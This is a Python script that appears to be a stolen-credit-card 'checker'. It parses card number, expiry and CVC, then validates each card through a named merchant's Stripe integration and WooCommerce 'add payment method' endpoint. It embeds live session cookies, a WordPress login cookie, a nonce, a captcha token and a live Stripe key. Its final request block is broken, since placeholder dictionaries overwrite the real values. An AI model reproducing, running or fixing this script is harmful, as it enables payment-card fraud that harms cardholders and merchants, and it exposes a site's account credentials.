import requests,re
def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
            'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=45712&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F8d64b7a725%3B+stripe-js-v3%2F8d64b7a725%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fsissylover.com&time_on_page=17226&client_attribution_metadata[client_session_id]=12f959cd-244e-4fc3-8404-7e0e4fc0487e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=358dbcae-d5f3-4797-9497-18619921d84a55ab33&muid=98211f66-51f1-454b-a68d-082cb65ea69a8995c8&sid=79cdb8e3-ae25-46ed-8b58-20602ee58c7fb5850e&key=pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQ2ZDWnhIck92L2NsM0o1MFN0Q3Bqc0YySFJPdmRLSHVYN1B4QVVBK0xpM2lnb0tEWDVjQTlkVkRZVnJLZEdkcGFpejVoQTNiSDQ2dkttOWZ5YWJwUkI3VUQ3ZThLRjNhcmNJeUJHREpTdnVwVlFDZUY4dkJtS2dCUWZ0YWcwUWZMM3lWWkhRdm9tQllhRkdoREgvZWpKRWc5Z1hkN1YxOFdYYXRTV085YlkwMlpucTZkTlpJVnV3SjdCTWJSVTRxL1c5WUNrSlZ0RVd3dnV4b3M1SXA5OExEaDBpV1NYYmNBeCtscmxZYTcwWDl4bldoKzdhZWFxR1l2dUxFRXhhN1RLdHdoYTFOUjBKblVWTDgrNm5GaDB3WHZJOTRiZ2Q1dm9nTVRwYjJ4VHhTeGFOUVByY2I3S3plajVHcHY3cDVUQkdybUFGTmNxcE5jQ3JJSXhOeU12dzdRR3NOU05TalYrVFUrNnFYeHN4Q1ZlZWlUT1lucmZzT2tUVG0rOGNhelJZVHEwRTBhNWFNWDl6TmhESEFWN2JWRmUrclI2VnRJc1l1MWVTYWZOckE1czB2SUswQ0tVRzJBNTUvTDFpeTA0VzZUUjBIY3dBVWx6SDZZdkE2MU4xUUlIazJSU0lneWhGTm80Q29TWXQ1SmVCWHdQNzB2VUFERHFTZjNjbU1meWFITjZGd2t5c05lMk9LcVJSbU9jR1ZyYWtiNFJkT0dPWDc4MndCMm9GK1BUTEM0Q3JYTHZCVVUrMUptNkRtR0pYcmtURWdNTE92MHY1bFhPSDUwMGtzcHlKTkxJWWtma0Nka3JjUEVnbGZUOUtLZ2sxWnN5U3F2eTN3SWNzazhJV2RJVktmWkJyR0JPOVJoQW5UWU5WVkJDTG45VkMvZ3R5S0NKZ1ZkRVpuN1lMNlAxZGQ1c01oaUQ4b3pOem1MczhWYnZiS1FLa1J3QVZDS0p3K05uN2lyMTNZZnpQNXVXUkdUeVg5VUdnSWJ0OVI4MXVIT1hyRStkY1hwS2o5L1pkWXBKbDFScG1EMHY3VUdZQytvOVowK2daUXZBTXkyU2YveDB1SUtGakd4VHJaYXRYSE9IWnlUNk1ZTFBwendSNmhZVWROUzJVa1ZiY3N2cFI1ckpsUGlkWk9URWNxUklNcGVBcVpucXBtUnFIQWlYcEo2ZW91Y2ZUSUVuSlhXbWtOQVF0MHZ3Q3hGcm1KVWZ5MmJkemJ0eENscDBDYmt0dUVSWDRVWEFqeHNuMFpLM3VBM2xqZ29nOEV4TVRKekNJdDEwTEsvQ24rRmtsU203UFBhQ1AzZlhlM1lFU1Y0WWViL0xicHF1dzc2SW4wRWVtbVljOXdrZVFqTmNmYUlUOHlQUTFZMlhGdlZKS2FrYk16QTk5VWQxbFNPblBOYnBXVS9VUFV3ajlyOE9LdC90OTIyZ1ZpV3JaNlNPU2JkdnROa0lQSVI0OGtIZlpzOHRLbzRNbHdjQUl6RXBpK0QwZTJNMHlCUWNxMWNQZ09jTnh6akh4bTBNNWw4L1RZbWRGYmZQL0YxSVZYeS9GOFN2OVVlY3B0OEFSWllOdDNTVXl3aDNpeW0yMS9JNzA4UFdsMDRWcHZOM3NZWWl3V3N5UmhhVzZ0dnJ2KzB1aUsrYUhoM0tzeDhjYXNKeFI4UC85ZlBDQ2lsQ2VUb3FEb1pldGpRNHJSV2Y0SDM3R3ZKYlVLeGhSTUZCempvZHRkUTR5YmR0TUlrZGVRREJlOEo2T3BRWG95RHRzZXB1bTRENXlsYms1QUk1YUNhQVZ1NW12OEwrVDBaSTVhTU9YNHBHQkFvTWw2RDVraitJRk9ydFp0SXFVb2g4djdwRVl2Q0FjMEhhTHgvQ0FSKzA1eHI1SU5ma2V0Yy9Tc2s0QnU5eFdwTGlYb3ovQUVqc213bllKeDd3VVNLRWhVSElkT21tK1p2VXBBTno0WjRaWjUzdXdWeVBBcEptVVhaTmN3b1BzbXMrR3haLzlPazdEbllDYWVCaDRpeEVKN3Z6Uk01akNES245ZDh1ZWg0VUZyektERlhlQnhzVVprMDBrUUFNT2V4Z0Yxc2llMEVMblpUdnE4dGF0cEwvWW1OUWpIRzZXR2lyVHB4UU5QU2ppcnZmcjlrdUU5bmR0Z2pXRGxlWjFXV3NUMDR6RDhLZm9uQlB5SUlzZDBQOWhDU2FiSzhJMkVHNTNIaGlmeGFSckVkU3JJbGFMMXh1UTZxSEdFMGZhUit0WTdacFFzZUliaytKTSsrZUhsU05nenVNMGZvS010djV2eUJDWmRFM1ZiTktEblFJSHpkNkdrMDYydEZaaDVrREFnWnY4RDRGTTkvcFZJZlc1S2dGZUt1SXlybVRWSmFZT29RaWxsMVk5MTRLcXhZVnZESWZhc3dleCtXVEs3U25vL0Q1eGd2YmZUazJ2bXpyMHZEc1pDZ3RYQllobDNUczE5enIzRjFuMThGNHVGdVRNMFhsSVJPQThtakhpSzdZN3NJWThzWUt1ekE4ZG8wdmovTVkvdTB4dU5GeEl3VU1wZGRxWHJYYmg5aHo5M2NhaytoaUcwdVd4T0tsNnZDSEV3MWJJL3BjTGpMQnFxZnB2UkZGNG8zN3ViRHJlc2FReGdYSUN6REUzWW1nNDVueWNUYjJzbEJrOU9LTDdCR1ZNV2NmNFptckRjUXkvTTNBaEI2UG0xWHprcE5NNGoxSWs1bmUwUG1tYzYvWnZ0NC9qRTZoMFg3dnBLRVVWN3BMb3lSbTA4QTk5T1RBTU02bGZUVXFYemsvcElyMm9ZWFpraDVoN3lQYWJob21pV05IKzhteU5JZUZRREVuWkpTdm5UTXc9PSIsImV4cCI6MTc0MjAxODExNiwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiIyZmRjZDFjMSIsInBkIjowLCJjZGF0YSI6IlJaM2Rza2MrbzBnajdyTlpuUWJmK3huOUJINVJWRm5CaWRtSXdTS1Rqbm5QSWRSR3pNSjAvYkFiU2wwejdwSW5jK1ZKT3lvQjBMNDAvOUZYMWtMQTJpNDBmTllHaUx0RG53QlNRQnBWMTMxUGRhQVBvM3hRZDFEKy9NdnNkUS9QRTlnZHo2TWpndmU3MWpkT3NGR2JyTUV1R0ZpamZDYWNKSVEydXdOcXNlRndDQmExSWErK000aXlDcmYyVnBtL09tTlNSVlJKOENHZjJ6d1UifQ.gQKdx7IVsqIxHwka5ZgQJl1rt6SnwZCKNMcZE-Uzvu0'
    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = r1.json()['id'] #'+str(pm)+'

    cookies = {
            'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-03-12%2003%3A50%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-03-12%2003%3A50%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F%22%2C%22session_start_time%22%3A%222025-03-12%2003%3A50%3A14%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '_clck': '1aklpyb%7C2%7Cfu5%7C0%7C1897',
    '__stripe_mid': '98211f66-51f1-454b-a68d-082cb65ea69a8995c8',
    '_ga': 'GA1.2.591453633.1741753222',
    '_ga_TJREF82VY2': 'GS1.1.1741753222.1.1.1741753578.0.0.0',
    'PHPSESSID': '88c7ebfec941d9c5f8447ec432b63a51',
    'wp_automatewoo_session_started': '1',
    'sbjs_current': '%C2%9E%C3%A9e',
    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F134.0.0.0%20Safari%2F537.36',
    '__stripe_sid': '79cdb8e3-ae25-46ed-8b58-20602ee58c7fb5850e',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'wordpress_logged_in_96b6c2e14a298a8aacd485caf4831926': 'Masterpiece1%7C1743227584%7CpTAzRsFyrZ78tllAtDqhNMvNQtMxtCtiSbE8NQGzqeN%7Cf89ecd842bff9ca64a799feae23880725f2767890ec35f8aff35adff7a192ec9',
    'wp_automatewoo_visitor_96b6c2e14a298a8aacd485caf4831926': 'rhqbm9hpz4l4w7nwti3i',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F',
    }

    headers = {
            'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://sissylover.com',
    'priority': 'u=1, i',
    'referer': 'https://sissylover.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
            'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': ''+str(pm)+'',
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '8d5ac02d63',
    }
    
    try:
        # Your JSON data, params, cookies, headers, etc.
        params = {...}
        cookies = {...}
        headers = {...}
        json_data = {...}

        # Send the POST request
        r2 = requests.post(
            'https://sissylover.com/',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data  # JSON data
        )

        # Print the response text (for debugging)
        print(r2.text)

        # Return the response text
        return r2.text

    except Exception as e:
        # If an error occurs, return the exception message
        return str(e)

